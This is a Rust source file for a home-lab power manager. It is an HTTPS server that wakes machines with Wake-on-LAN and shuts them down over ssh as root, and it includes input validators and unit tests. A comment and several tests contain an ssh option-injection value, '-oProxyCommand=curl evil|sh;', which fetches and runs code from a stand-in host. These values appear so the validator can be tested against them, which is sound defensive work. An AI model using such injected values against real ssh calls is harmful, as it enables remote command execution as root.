use axum::{extract::State, routing::{get, post}, Json, Router};
use axum_server::tls_rustls::RustlsConfig;
use serde::{Deserialize, Serialize};
use std::{
    collections::HashMap,
    net::SocketAddr,
    sync::{
        atomic::{AtomicU64, Ordering},
        Arc, Mutex,
    },
};
use tokio::{net::TcpStream, process::Command, time::{interval, timeout, Duration, MissedTickBehavior}};
use tower_http::services::ServeDir;

// A node is either settled (up/down, confirmed by an ICMP poll) or mid-transition
// (confirming_up/confirming_down: a lever was flicked, the new state is assumed but not
// yet confirmed by the network card). Transitions live here, in memory, so the TUI and
// the WebGUI - both of which read /api/nodes - observe one unified state machine.
struct Trans {
    status: &'static str, // "confirming_up" | "confirming_down"
    gen: u64,             // supersedes older polls for the same ip when re-flicked
}

#[derive(Clone)]
struct AppState {
    key_file: String,
    blob_file: String,
    srv_blob: String,
    ssh_key: String,
    transitions: Arc<Mutex<HashMap<String, Trans>>>,
    gen_counter: Arc<AtomicU64>,
}

impl AppState {
    fn new() -> Self {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
        Self {
            key_file: format!("{}/.allumeur-scripts/encrypted/.root_key", home),
            blob_file: format!("{}/.allumeur-scripts/encrypted/usr_blob.enc", home),
            srv_blob: format!("{}/.allumeur-scripts/encrypted/srv_blob.enc", home),
            ssh_key: format!("{}/.allumeur-scripts/encrypted/allumeur-master-key", home),
            transitions: Arc::new(Mutex::new(HashMap::new())),
            gen_counter: Arc::new(AtomicU64::new(0)),
        }
    }
}

// v11 contract. `order` is an int in both structs and drives ONE ordering for the TUI and the
// website alike ("the shelf"): a node's order is its position in the single global shelf shared
// by nodes and standalone services; a service whose ip exactly string-equals some node's ip is
// grouped under that node and its order is its position INSIDE that group; any other service is
// standalone and its order is its shelf position. The backend only parses and serves these
// numbers - the writers (suite tooling) keep them as clamped 1..K permutations.
// `pretty` is the guest-facing display name: GUEST MODE shows pretty (falling back to the real
// name when pretty is empty); ALLUMEUR MODE shows the real name. The backend serves both; the
// front ends pick. Empty is a perfectly valid pretty (means "no guest alias").
#[derive(Serialize)] struct Node { mac: String, ip: String, name: String, user: String, subtitle: String, luks_blocked: bool, status: String, favourite: bool, order: u32, pretty: String }
#[derive(Serialize)] struct Service { name: String, ip: String, port: String, subtitle: String, status: String, favourite: bool, order: u32, pretty: String }
#[derive(Deserialize)] struct ToggleRequest { mac: String, ip: String, user: String, state: String }

// Derive subnet broadcast from a node's IP so WoL magic packets reach powered-off machines.
// A unicast to the machine's IP won't work when it's off - the ARP entry is gone.
fn derive_broadcast(ip: &str) -> String {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() == 4 {
        format!("{}.{}.{}.255", parts[0], parts[1], parts[2])
    } else {
        "255.255.255.255".to_string()
    }
}

// Validate a Unix username before it is handed to ssh. Rules: first char a lowercase letter or
// '_', thereafter lowercase letters, digits, '_' or '-'. This is `^[a-z_][a-z0-9_-]*$`. Crucially
// it forbids a leading '-', so a hostile "user" like "-oProxyCommand=curl evil|sh;" can never be
// parsed by ssh as an option and executed as root at connection setup.
fn valid_user(user: &str) -> bool {
    let mut bytes = user.bytes();
    match bytes.next() {
        Some(b) if b == b'_' || b.is_ascii_lowercase() => {}
        _ => return false,
    }
    bytes.all(|b| b == b'_' || b == b'-' || b.is_ascii_lowercase() || b.is_ascii_digit())
}

// Validate an IPv4 dotted-quad: exactly four decimal octets, each 0..=255, digits only. Rejects
// anything ssh could mistake for an option flag (a leading '-') or a shell metacharacter, so the
// destination we build is always a plain address.
fn valid_ipv4(ip: &str) -> bool {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() != 4 { return false; }
    parts.iter().all(|p| {
        !p.is_empty()
            && p.len() <= 3
            && p.bytes().all(|b| b.is_ascii_digit())
            && p.parse::<u16>().map_or(false, |n| n <= 255)
    })
}

async fn decrypt_blob(file: &str, key_file: &str) -> String {
    match Command::new("openssl")
        .args(["enc", "-aes-256-cbc", "-d", "-salt", "-pbkdf2", "-pass", &format!("file:{}", key_file), "-in", file])
        .output().await
    {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(_) => String::new(),
    }
}

async fn check_ping(ip: String) -> String {
    if let Ok(res) = Command::new("ping").args(["-c", "1", "-W", "1", &ip]).output().await {
        if res.status.success() { return "up".to_string(); }
    }
    "down".to_string()
}

async fn check_tcp(ip: String, port: String) -> String {
    match timeout(Duration::from_secs(1), TcpStream::connect(format!("{}:{}", ip, port))).await {
        Ok(Ok(_)) => "up".to_string(),
        _ => "down".to_string(),
    }
}

// Aggressive WoL: unicast (works once ARP is warm) + subnet broadcast + limited broadcast,
// on both common WoL ports. Mirrors the CLI's `hit lights` so both paths wake identically.
async fn send_wol(ip: &str, bcast: &str, mac: &str) {
    for tgt in [ip, bcast, "255.255.255.255"] {
        for port in ["9", "7"] {
            let _ = Command::new("wakeonlan").args(["-i", tgt, "-p", port, mac]).output().await;
        }
    }
}

// ── transition bookkeeping ──────────────────────────────────────────────────
fn set_transition(state: &AppState, ip: &str, status: &'static str) -> u64 {
    let gen = state.gen_counter.fetch_add(1, Ordering::SeqCst) + 1;
    state.transitions.lock().unwrap().insert(ip.to_string(), Trans { status, gen });
    gen
}
fn still_current(state: &AppState, ip: &str, gen: u64) -> bool {
    state.transitions.lock().unwrap().get(ip).map_or(false, |t| t.gen == gen)
}
// Remove our transition (only if still ours). Afterwards /api/nodes reports the real ping,
// so "resolved" and "timed out / reverted" collapse to the same action: let the wire speak.
fn clear_transition(state: &AppState, ip: &str, gen: u64) {
    let mut m = state.transitions.lock().unwrap();
    if m.get(ip).map_or(false, |t| t.gen == gen) { m.remove(ip); }
}

// Turning on: poll ICMP every 2s for 60s; blast WoL at t=0/20/40 (a fresh series every 20s,
// but NOT on the final poll at 60s). First reply → confirmed up. No reply by 60s → revert.
// The cadence is driven off a real wall clock (tokio interval + Instant), NOT a loop counter:
// pinging a still-down host costs ~1s each, which would otherwise stretch the 60s window and
// smear the 20s WoL spacing. The interval absorbs the ping cost so polls stay on the 2s grid.
async fn confirm_on(state: AppState, mac: String, ip: String, gen: u64) {
    let bcast = derive_broadcast(&ip);
    let wol_marks = [0u64, 20, 40];
    let mut wol_idx = 0usize;
    let start = std::time::Instant::now();
    let mut ticker = interval(Duration::from_secs(2)); // first tick fires immediately (t≈0)
    ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
    loop {
        ticker.tick().await;
        if !still_current(&state, &ip, gen) { return; } // a newer flick took over
        let elapsed = start.elapsed().as_secs();
        // Fire a fresh WoL series as we cross each 20s mark; never on/after the 60s poll.
        while wol_idx < wol_marks.len() && elapsed >= wol_marks[wol_idx] {
            if wol_marks[wol_idx] < 60 { send_wol(&ip, &bcast, &mac).await; }
            wol_idx += 1;
        }
        if check_ping(ip.clone()).await == "up" { break; }
        if elapsed >= 60 { break; }
    }
    clear_transition(&state, &ip, gen);
}

// Turning off: issue the shutdown once, then poll every 2s for 60s until it stops answering.
// Confirmed down → resolve. Still answering at 60s → revert to up (shutdown didn't take).
// Same wall-clock 2s cadence as confirm_on.
async fn confirm_off(state: AppState, user: String, ip: String, gen: u64) {
    // No -t: the server has no TTY. The master key handles auth; sudoers must allow poweroff.
    let _ = Command::new("ssh")
        .args([
            "-i", &state.ssh_key,
            "-q",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "--", // end of options: the destination can never be parsed as a flag even if validation is bypassed
            &format!("{}@{}", user, ip),
            "sudo poweroff 2>/dev/null || poweroff",
        ])
        .output().await;

    let start = std::time::Instant::now();
    let mut ticker = interval(Duration::from_secs(2));
    ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
    loop {
        ticker.tick().await;
        if !still_current(&state, &ip, gen) { return; }
        if check_ping(ip.clone()).await == "down" { break; }
        if start.elapsed().as_secs() >= 60 { break; }
    }
    clear_transition(&state, &ip, gen);
}

// Parse the order field. Valid orders are 1..K shelf/group positions written by the suite;
// a junk or empty field parses to 0 - a safe deterministic fallback that sorts before every
// real position, so a damaged record surfaces at the front of its list instead of being
// dropped or landing somewhere random.
fn parse_order(s: &str) -> u32 {
    s.parse::<u32>().unwrap_or(0)
}

// mac,ip,name,user,subtitle,luks,favourite,order,pretty - exactly nine fields (v11). Only this
// system writes the database and every writer emits all nine, so a line of any other shape
// (including the old v10 eight-field one) is not a record. Read byte-for-byte, the same test
// bash makes, because the WebGUI and the CLI disagreeing about which machines are safe to wake
// is how pi-blocker ends up stranded at its passphrase prompt. favourite ("1" = true, anything
// else = false, same convention as luks) marks the node for the guest view; non-favourites
// surface only in allumeur mode. order is the node's global shelf position (see the struct
// comment); junk/empty -> 0. pretty is the guest-facing display name and sits LAST; an empty
// pretty is valid (guest mode then falls back to the real name). Commas remain forbidden in
// every field - this is still CSV.
fn parse_node_record(line: &str) -> Option<(String, String, String, String, String, bool, bool, u32, String)> {
    let parts: Vec<&str> = line.split(',').collect();
    if parts.len() != 9 { return None; }
    if parts[1].is_empty() { return None; }
    Some((
        parts[0].to_string(),
        parts[1].to_string(),
        parts[2].to_string(),
        parts[3].to_string(),
        parts[4].to_string(),
        parts[5] == "1",
        parts[6] == "1",
        parse_order(parts[7]),
        parts[8].to_string(),
    ))
}

// name,ip,port,subtitle,favourite,order,pretty - exactly seven fields (v11), same strictness
// as node records: every writer emits all seven, so any other shape (including the old v10
// six-field one) is not a record. favourite follows the same "1"-means-true convention. order
// is the group position when the service's ip exactly string-equals a node's ip, else its
// shelf position; junk/empty -> 0. pretty sits LAST and may be empty (guest mode then falls
// back to the real name).
fn parse_service_record(line: &str) -> Option<(String, String, String, String, bool, u32, String)> {
    let parts: Vec<&str> = line.split(',').collect();
    if parts.len() != 7 { return None; }
    Some((
        parts[0].to_string(),
        parts[1].to_string(),
        parts[2].to_string(),
        parts[3].to_string(),
        parts[4] == "1",
        parse_order(parts[5]),
        parts[6].to_string(),
    ))
}

// Whitelist check: does the decrypted database hold a real node with exactly this ip AND user?
// The power-off path must act only on enrolled machines, never on an arbitrary host:user the
// caller names. Reads the same nine-field records get_nodes trusts.
fn node_enrolled(raw: &str, ip: &str, user: &str) -> bool {
    raw.lines().any(|line| {
        parse_node_record(line).map_or(false, |(_, r_ip, _, r_user, _, _, _, _, _)| r_ip == ip && r_user == user)
    })
}

async fn get_nodes(State(state): State<Arc<AppState>>) -> Json<Vec<Node>> {
    let raw = decrypt_blob(&state.blob_file, &state.key_file).await;
    let mut tasks = vec![];
    for line in raw.lines() {
        if let Some((mac, ip, name, user, subtitle, luks_blocked, favourite, order, pretty)) = parse_node_record(line) {
            tasks.push(tokio::spawn(async move {
                Node { mac, ip: ip.clone(), name, user, subtitle, luks_blocked, status: check_ping(ip).await, favourite, order, pretty }
            }));
        }
    }
    let mut nodes = vec![];
    for t in tasks { if let Ok(n) = t.await { nodes.push(n); } }

    // Overlay in-flight transitions on top of the live ping so a confirming node reads
    // as confirming_up/confirming_down rather than the (not-yet-true) raw ping result.
    {
        let m = state.transitions.lock().unwrap();
        for n in nodes.iter_mut() {
            if let Some(tr) = m.get(&n.ip) { n.status = tr.status.to_string(); }
        }
    }
    Json(nodes)
}

async fn get_services(State(state): State<Arc<AppState>>) -> Json<Vec<Service>> {
    let raw = decrypt_blob(&state.srv_blob, &state.key_file).await;
    let mut tasks = vec![];
    for line in raw.lines() {
        if let Some((name, ip, port, subtitle, favourite, order, pretty)) = parse_service_record(line) {
            tasks.push(tokio::spawn(async move {
                Service { name, ip: ip.clone(), port: port.clone(), subtitle, status: check_tcp(ip, port).await, favourite, order, pretty }
            }));
        }
    }
    let mut services = vec![];
    for t in tasks { if let Ok(s) = t.await { services.push(s); } }
    Json(services)
}

// Flicking a lever assumes the new state immediately (confirming_*) and kicks off a background
// poller that confirms it over the network card. Returns at once; the UI watches /api/nodes.
async fn toggle_node(State(state): State<Arc<AppState>>, Json(payload): Json<ToggleRequest>) -> Json<serde_json::Value> {
    if payload.state == "on" {
        // WoL only needs a well-formed target address; reject anything else fast.
        if !valid_ipv4(&payload.ip) {
            eprintln!("toggle_node: rejected 'on': invalid ip {:?}", payload.ip);
            return Json(serde_json::json!({ "status": "rejected" }));
        }
        let gen = set_transition(&state, &payload.ip, "confirming_up");
        let st = (*state).clone();
        let (mac, ip) = (payload.mac.clone(), payload.ip.clone());
        tokio::spawn(async move { confirm_on(st, mac, ip, gen).await; });
        Json(serde_json::json!({ "status": "accepted", "state": "confirming_up" }))
    } else if payload.state == "off" {
        // The off path builds an ssh destination and runs poweroff as root, so both the user and
        // the ip must be strictly well-formed, and the (ip,user) pair must name a real enrolled
        // node. Validate cheaply first, then confirm enrollment against the decrypted database.
        if !valid_user(&payload.user) || !valid_ipv4(&payload.ip) {
            eprintln!("toggle_node: rejected 'off': invalid user/ip {:?}@{:?}", payload.user, payload.ip);
            return Json(serde_json::json!({ "status": "rejected" }));
        }
        let raw = decrypt_blob(&state.blob_file, &state.key_file).await;
        if !node_enrolled(&raw, &payload.ip, &payload.user) {
            eprintln!("toggle_node: rejected 'off': no enrolled node {}@{}", payload.user, payload.ip);
            return Json(serde_json::json!({ "status": "rejected" }));
        }
        let gen = set_transition(&state, &payload.ip, "confirming_down");
        let st = (*state).clone();
        let (user, ip) = (payload.user.clone(), payload.ip.clone());
        tokio::spawn(async move { confirm_off(st, user, ip, gen).await; });
        Json(serde_json::json!({ "status": "accepted", "state": "confirming_down" }))
    } else {
        Json(serde_json::json!({ "status": "ignored" }))
    }
}

#[tokio::main]
async fn main() {
    let state = Arc::new(AppState::new());
    let app = Router::new()
        .route("/api/nodes", get(get_nodes))
        .route("/api/services", get(get_services))
        .route("/api/nodes/toggle", post(toggle_node))
        .nest_service("/", ServeDir::new("/opt/allumeur/public"))
        .with_state(state);

    // rustls 0.23 needs one process-wide crypto provider chosen explicitly, or the first TLS
    // handshake aborts. ring is the light, pure-build backend that static-links cleanly on musl.
    rustls::crypto::ring::default_provider().install_default()
        .expect("failed to install the ring crypto provider");
    let config = RustlsConfig::from_pem_file("/opt/allumeur/certs/cert.pem", "/opt/allumeur/certs/key.pem").await.unwrap();
    let addr = SocketAddr::from(([0, 0, 0, 0], 443));
    println!("Allumeur Engine natively serving HTTPS directly on :443");

    axum_server::bind_rustls(addr, config).serve(app.into_make_service()).await.unwrap();
}

// panic = "abort" applies to release binaries; Cargo ignores it for test builds, so
// `cargo test` works in both profiles (the CI container runs `cargo test --release`).
#[cfg(test)]
mod tests {
    use super::{parse_node_record, parse_service_record, valid_user, valid_ipv4, node_enrolled};

    fn p(line: &str) -> (String, String, String, String, String, bool, bool, u32, String) {
        parse_node_record(line).expect("record should parse")
    }

    fn ps(line: &str) -> (String, String, String, String, bool, u32, String) {
        parse_service_record(line).expect("service record should parse")
    }

    #[test]
    fn nine_field_blocked() {
        let r = p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,3,The Gatekeeper");
        assert_eq!(r, ("aa:bb:cc:dd:ee:ff".into(), "192.168.77.11".into(), "pi-blocker".into(), "root".into(), "big box".into(), true, false, 3, "The Gatekeeper".into()));
    }

    #[test]
    fn nine_field_not_blocked() {
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.12,pfsense-wall,root,gaming rig,0,1,1,").5, false);
    }

    // An empty subtitle is a real record shape: nodes.sh writes the field whether or not the
    // user typed anything into it.
    #[test]
    fn empty_subtitle_still_parses() {
        let r = p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,,0,0,2,Photo Vault");
        assert_eq!(r.4, "");
        assert_eq!(r.5, false);
    }

    #[test]
    fn junk_luks_field_means_false() {
        assert_eq!(p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,airy,yes,1,1,").5, false);
    }

    // favourite follows the same "1"-means-true, junk-means-false convention as luks.
    #[test]
    fn node_favourite_one_zero_junk() {
        assert_eq!(p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,airy,0,1,1,Photo Vault").6, true);
        assert_eq!(p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,airy,0,0,1,").6, false);
        assert_eq!(p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,airy,0,yes,1,").6, false);
        assert_eq!(p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,airy,0,,1,").6, false);
    }

    // order sits second-to-last on both record shapes; a valid integer parses through as-is.
    #[test]
    fn order_parses_on_both_shapes() {
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,1,The Gatekeeper").7, 1);
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,42,").7, 42);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,1,7,Snappy Cache").5, 7);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,0,1,").5, 1);
    }

    // Junk or empty order falls back to 0 deterministically: the record still parses (the
    // machine remains reachable/wakeable) and 0 sorts before every real 1..K position.
    #[test]
    fn junk_or_empty_order_falls_back_to_zero() {
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,,The Gatekeeper").7, 0);
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,first,").7, 0);
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,-3,").7, 0);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,1,,Snappy Cache").5, 0);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,1,3.5,").5, 0);
    }

    // pretty is the LAST field on both shapes: a set value passes through verbatim, and an
    // EMPTY pretty is a fully valid record (guest mode falls back to the real name; the
    // record must NOT be rejected).
    #[test]
    fn pretty_parses_set_and_empty() {
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,3,The Gatekeeper").8, "The Gatekeeper");
        assert_eq!(p("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,3,").8, "");
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,1,7,Snappy Cache").6, "Snappy Cache");
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,1,7,").6, "");
        // pretty with spaces and mixed case is fine - only the comma is forbidden (CSV).
        assert_eq!(p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,,0,0,2,Family Photo Vault (upstairs)").8, "Family Photo Vault (upstairs)");
    }

    // Empty pretty and empty subtitle together: trailing ",," still makes a nine-field line.
    #[test]
    fn empty_pretty_and_subtitle_together() {
        let r = p("02:00:00:00:00:12,192.168.77.14,immich-provider,root,,0,0,2,");
        assert_eq!(r.4, "");
        assert_eq!(r.8, "");
        let s = ps("cache-front,192.168.77.21,8080,,0,1,");
        assert_eq!(s.3, "");
        assert_eq!(s.6, "");
    }

    #[test]
    fn short_record_rejected() {
        assert!(parse_node_record("02:00:00:00:00:12,192.168.77.14,immich-provider").is_none());
        assert!(parse_node_record("02:00:00:00:00:12,,immich-provider,root").is_none());
        // nine fields but empty ip is still not a node
        assert!(parse_node_record("02:00:00:00:00:12,,immich-provider,root,airy,0,0,1,Photo Vault").is_none());
    }

    // No backwards compatibility: the old v10 eight-field node record (no pretty) - or an
    // over-long ten-field line - is not a record. Same for services: only exactly seven
    // fields parse; the old six-field shape is rejected.
    #[test]
    fn wrong_count_records_rejected() {
        // old v10 8-field node shape (no pretty)
        assert!(parse_node_record("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,1").is_none());
        // pre-v10 7-field node shape (no order)
        assert!(parse_node_record("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0").is_none());
        // old 6-field node shape
        assert!(parse_node_record("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1").is_none());
        // 10-field node line
        assert!(parse_node_record("aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,0,1,The Gatekeeper,extra").is_none());
        // old v10 6-field service shape (no pretty)
        assert!(parse_service_record("cache-front,192.168.77.21,8080,fast tier,1,1").is_none());
        // pre-v10 5-field service shape (no order)
        assert!(parse_service_record("cache-front,192.168.77.21,8080,fast tier,1").is_none());
        // old 3- and 4-field service shapes
        assert!(parse_service_record("cache-front,192.168.77.21,8080").is_none());
        assert!(parse_service_record("cache-front,192.168.77.21,8080,fast tier").is_none());
        // 8-field service line
        assert!(parse_service_record("cache-front,192.168.77.21,8080,fast tier,1,1,Snappy Cache,extra").is_none());
        // blank line
        assert!(parse_service_record("").is_none());
    }

    #[test]
    fn service_seven_field_parses() {
        let r = ps("cache-front,192.168.77.21,8080,fast tier,1,2,Snappy Cache");
        assert_eq!(r, ("cache-front".into(), "192.168.77.21".into(), "8080".into(), "fast tier".into(), true, 2, "Snappy Cache".into()));
        // empty subtitle is still a real record
        assert_eq!(ps("cache-front,192.168.77.21,8080,,0,1,Snappy Cache").3, "");
    }

    // favourite on service records: same 1/0/junk convention.
    #[test]
    fn service_favourite_one_zero_junk() {
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,1,1,Snappy Cache").4, true);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,0,1,").4, false);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,yes,1,").4, false);
        assert_eq!(ps("cache-front,192.168.77.21,8080,fast tier,,1,").4, false);
    }


    #[test]
    fn blank_lines_rejected() {
        assert!(parse_node_record("").is_none());
        assert!(parse_node_record("   \t ").is_none());
    }

    // A "user" beginning with '-' is exactly the injection vector: ssh would read it as an option
    // (e.g. -oProxyCommand=...) and run it as root. The validator must reject any leading dash.
    #[test]
    fn user_leading_dash_rejected() {
        assert!(!valid_user("-oProxyCommand=curl evil|sh;"));
        assert!(!valid_user("-maddev"));
        assert!(!valid_user(""));
        assert!(!valid_user("Mad"));        // uppercase not allowed
        assert!(!valid_user("mad user"));   // whitespace not allowed
        assert!(!valid_user("1abc"));       // leading digit not allowed
    }

    // Ordinary Unix usernames pass unchanged.
    #[test]
    fn normal_user_accepted() {
        assert!(valid_user("maddev"));
        assert!(valid_user("root"));
        assert!(valid_user("_sys"));
        assert!(valid_user("pi-blocker"));
    }

    // Anything that is not a clean four-octet dotted quad is rejected, including a dash-led string
    // that ssh could treat as an option.
    #[test]
    fn bad_ip_rejected() {
        assert!(!valid_ipv4("192.0.2"));       // three octets
        assert!(!valid_ipv4("192.0.2.1.1"));   // five octets
        assert!(!valid_ipv4("192.0.2.256"));   // octet out of range
        assert!(!valid_ipv4("192.0.2."));      // empty octet
        assert!(!valid_ipv4("-o192.0.2.1"));   // ssh-option shaped
        assert!(!valid_ipv4("evil|sh"));         // shell metacharacters
        assert!(valid_ipv4("192.168.77.11"));    // valid
        assert!(valid_ipv4("0.0.0.0"));
        assert!(valid_ipv4("255.255.255.255"));
    }

    // The whitelist must match on BOTH ip and user, and must refuse pairs absent from the blob -
    // including an attacker-supplied ssh-option "user" that is not a real enrolled node. Only
    // v11 nine-field records count: a stale v10 eight-field line must not enroll anything.
    // Records with empty pretty enroll exactly like records with a set pretty.
    #[test]
    fn enrolled_whitelist_matches_ip_and_user() {
        let blob = "aa:bb:cc:dd:ee:ff,192.168.77.11,pi-blocker,root,big box,1,1,1,The Gatekeeper\n\
                    02:00:00:00:00:12,192.168.77.14,immich-provider,maddev,,0,0,2,\n\
                    02:00:00:00:00:13,192.168.77.15,stale-node,root,old shape,0,0,3\n";
        assert!(node_enrolled(blob, "192.168.77.11", "root"));      // set pretty
        assert!(node_enrolled(blob, "192.168.77.14", "maddev"));    // empty pretty still enrolls
        assert!(!node_enrolled(blob, "192.168.77.11", "maddev"));   // right ip, wrong user
        assert!(!node_enrolled(blob, "10.0.0.1", "root"));          // unknown ip
        assert!(!node_enrolled(blob, "192.168.77.15", "root"));     // stale v10 8-field line is not a record
        assert!(!node_enrolled(blob, "192.168.77.11", "-oProxyCommand=curl evil|sh;"));
    }
}
